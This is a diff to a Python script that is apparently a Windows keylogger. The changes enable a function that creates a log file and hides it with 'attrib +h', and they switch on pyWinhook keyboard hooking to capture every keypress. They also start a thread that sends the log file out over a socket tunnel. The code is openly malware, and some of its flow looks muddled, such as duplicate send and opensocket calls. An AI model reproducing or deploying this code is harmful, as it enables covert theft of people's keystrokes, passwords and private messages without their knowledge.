@@ -8,11 +8,12 @@ filepath = "log.txt"
 
 # turn file to hidden
 def hide():
-    file = open(filepath, "w+", encoding='utf-8')
+    file = open(filepath, "w", encoding='utf-8')
     file.close()
     p = os.popen('attrib +h ' + filepath)
     t = p.read()
     p.close()
+
 
 def opensocket():
     openTunnel = newServer.transfer(filepath)
@@ -37,25 +38,25 @@ def encodeTXT(s):
 
 
 def start():
-    # hide()
+    hide()
     ot = opensocket()
-    # hm = pyWinhook.HookManager()
-    # hm.HookKeyboard()
-    # # every event from the keybord will pawer onKeyDown function
-    # hm.SubscribeKeyDown(onKeyDown)
-    # pythoncom.PumpMessages()
+    send_thread = threading.Thread(target=ot.send_file)
+    send_thread.start()
     send(ot)
+    hm = pyWinhook.HookManager()
+    hm.HookKeyboard()
+    # every event from the keybord will pawer onKeyDown function
+    hm.SubscribeKeyDown(onKeyDown)
+    pythoncom.PumpMessages()
 
 
 def send(ot):
     # something
+
     ot.send_file()
-
-
-def report(ot):
-    send(ot)
-    threading.Timer(2, report).start()
 
 
 # Start tunnel
 start()
+
+opensocket()
